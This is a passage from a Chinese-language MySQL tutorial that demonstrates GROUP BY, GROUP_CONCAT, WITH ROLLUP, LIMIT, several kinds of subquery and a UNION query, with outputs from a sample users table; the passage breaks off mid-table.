关键字时，查询结果会只显示每个分组的第一条记录。</pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>GROUP_CONCAT<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"167\"></td><td><pre><span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> 关键字可以和 GROUP_CONCAT<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数一起使用。GROUP_CONCAT<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数</pre></td></tr><tr><td data-num=\"168\"></td><td><pre>会把每个分组的字段值都显示出来</pre></td></tr><tr><td data-num=\"169\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span> GROUP_CONCAT<span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+------------------+</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre><span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> GROUP_CONCAT<span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+------------------+</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre><span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> <span class=\"token number\">75757575</span><span class=\"token punctuation\">,</span><span class=\"token number\">2931023</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre><span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span>         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre><span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> <span class=\"token number\">878787</span>           <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre><span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> <span class=\"token number\">1133333</span>          <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+------------------+</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>count和<span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> username<span class=\"token punctuation\">,</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+-----------------+</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre><span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+-----------------+</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre><span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span>               <span class=\"token number\">2</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre><span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span>               <span class=\"token number\">1</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre><span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span>               <span class=\"token number\">1</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre><span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span>               <span class=\"token number\">1</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+-----------------+</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre></pre></td></tr><tr><td data-num=\"190\"></td><td><pre><span class=\"token keyword\">WITH</span> POLLUP 关键字用来在所有记录的最后加上一条记录，这条记录是上面所有记</pre></td></tr><tr><td data-num=\"191\"></td><td><pre>录的总和，即统计记录数量。</pre></td></tr><tr><td data-num=\"192\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span> group_concat<span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> username <span class=\"token keyword\">WITH ROLLUP</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+-----------------------------------------+</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre><span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> group_concat<span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span>                        <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+-----------------------------------------+</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre><span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> <span class=\"token number\">75757575</span><span class=\"token punctuation\">,</span><span class=\"token number\">2931023</span>                         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre><span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span>                                <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre><span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> <span class=\"token number\">878787</span>                                  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre><span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> <span class=\"token number\">1133333</span>                                 <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>     <span class=\"token operator\">|</span> <span class=\"token number\">75757575</span><span class=\"token punctuation\">,</span><span class=\"token number\">2931023</span><span class=\"token punctuation\">,</span><span class=\"token number\">21987321</span><span class=\"token punctuation\">,</span><span class=\"token number\">878787</span><span class=\"token punctuation\">,</span><span class=\"token number\">1133333</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+-----------------------------------------+</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre><span class=\"token keyword\">limit</span> 查询</pre></td></tr><tr><td data-num=\"204\"></td><td><pre>限制查询数量</pre></td></tr><tr><td data-num=\"205\"></td><td><pre>从<span class=\"token number\">1</span>开始查询<span class=\"token number\">6</span>个</pre></td></tr><tr><td data-num=\"206\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span>  <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span>  <span class=\"token number\">2931023</span> <span class=\"token operator\">|</span> admin123<span class=\"token variable\">@.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre><span class=\"token number\">4</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre></pre></td></tr><tr><td data-num=\"217\"></td><td><pre></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>子查询</pre></td></tr><tr><td data-num=\"219\"></td><td><pre><span class=\"token keyword\">as</span><span class=\"token punctuation\">(</span>起一个别名<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">as</span> 数据库版本 <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+------------+</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span> 数据库版本 <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+------------+</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span>  <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>     <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span>  <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>     <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>     <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>     <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"228\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span>  <span class=\"token number\">2931023</span> <span class=\"token operator\">|</span> admin123<span class=\"token variable\">@.com</span> <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>     <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+------------+</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre></pre></td></tr><tr><td data-num=\"231\"></td><td><pre></pre></td></tr><tr><td data-num=\"232\"></td><td><pre></pre></td></tr><tr><td data-num=\"233\"></td><td><pre><span class=\"token keyword\">where</span>型子查询</pre></td></tr><tr><td data-num=\"234\"></td><td><pre>（把内层查询结果当作外层查询的比较条件）\t</pre></td></tr><tr><td data-num=\"235\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> id <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"236\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"237\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"238\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"239\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span>  <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"240\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span>  <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"241\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"242\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"243\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span>  <span class=\"token number\">2931023</span> <span class=\"token operator\">|</span> admin123<span class=\"token variable\">@.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"244\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"245\"></td><td><pre><span class=\"token number\">5</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"246\"></td><td><pre></pre></td></tr><tr><td data-num=\"247\"></td><td><pre></pre></td></tr><tr><td data-num=\"248\"></td><td><pre><span class=\"token keyword\">from</span>型子查询 </pre></td></tr><tr><td data-num=\"249\"></td><td><pre>\t<span class=\"token punctuation\">(</span>把内层的查询结果供外层再次查询<span class=\"token punctuation\">)</span>\t\t\t\t</pre></td></tr><tr><td data-num=\"250\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> ctt <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"251\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+----------+</span></pre></td></tr><tr><td data-num=\"252\"></td><td><pre><span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"253\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+----------+</span></pre></td></tr><tr><td data-num=\"254\"></td><td><pre><span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321 <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"255\"></td><td><pre><span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"256\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+----------+</span></pre></td></tr><tr><td data-num=\"257\"></td><td><pre><span class=\"token number\">2</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"258\"></td><td><pre></pre></td></tr><tr><td data-num=\"259\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> ctt <span class=\"token keyword\">where</span> id<span class=\"token operator\">></span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"260\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+</span></pre></td></tr><tr><td data-num=\"261\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"262\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+</span></pre></td></tr><tr><td data-num=\"263\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"264\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"265\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"266\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+</span></pre></td></tr><tr><td data-num=\"267\"></td><td><pre></pre></td></tr><tr><td data-num=\"268\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> ctt <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"269\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+</span></pre></td></tr><tr><td data-num=\"270\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"271\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+</span></pre></td></tr><tr><td data-num=\"272\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321 <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"273\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"274\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+ </span></pre></td></tr><tr><td data-num=\"275\"></td><td><pre></pre></td></tr><tr><td data-num=\"276\"></td><td><pre></pre></td></tr><tr><td data-num=\"277\"></td><td><pre></pre></td></tr><tr><td data-num=\"278\"></td><td><pre><span class=\"token keyword\">exists</span>型子查询</pre></td></tr><tr><td data-num=\"279\"></td><td><pre>\t（把外层查询结果拿到内层，看内层的查询是否成立）</pre></td></tr><tr><td data-num=\"280\"></td><td><pre></pre></td></tr><tr><td data-num=\"281\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> <span class=\"token keyword\">exists</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">></span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"282\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"283\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"284\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"285\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span>  <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"286\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span>  <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"287\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"288\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"289\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span>  <span class=\"token number\">2931023</span> <span class=\"token operator\">|</span> admin123<span class=\"token variable\">@.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"290\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"291\"></td><td><pre></pre></td></tr><tr><td data-num=\"292\"></td><td><pre></pre></td></tr><tr><td data-num=\"293\"></td><td><pre></pre></td></tr><tr><td data-num=\"294\"></td><td><pre></pre></td></tr><tr><td data-num=\"295\"></td><td><pre><span class=\"token keyword\">union</span>联合查询</pre></td></tr><tr><td data-num=\"296\"></td><td><pre>注意两边的列数要一样不然会报错，可以用数字子母等占位</pre></td></tr><tr><td data-num=\"297\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span> <span class=\"token keyword\">from</span> nasa<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"298\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"299\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"300\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"301\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span>  <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"302\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span>  <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"303\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"304\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  